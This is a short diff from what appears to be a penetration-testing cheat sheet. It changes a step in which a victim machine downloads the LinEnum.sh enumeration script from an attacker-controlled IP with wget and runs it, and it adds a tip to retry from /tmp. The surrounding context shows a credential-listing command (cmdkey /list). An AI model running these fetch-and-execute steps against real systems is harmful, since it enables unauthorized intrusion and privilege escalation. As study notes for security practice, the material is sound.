@@ -222,7 +222,8 @@ cmdkey /list
 
 #setup a python web server on attacker
 #dowload LinEnum.sh from attacker to victim
-wget http://10.11.0.90/LinEnum.sh
+wget http://10.11.0.xx/LinEnum.sh
+#warning you might get acccess denied. if so try using the /tmp directory
 #execute LinEnum.sh
 ./LinEnum.sh
 #######################################################################################
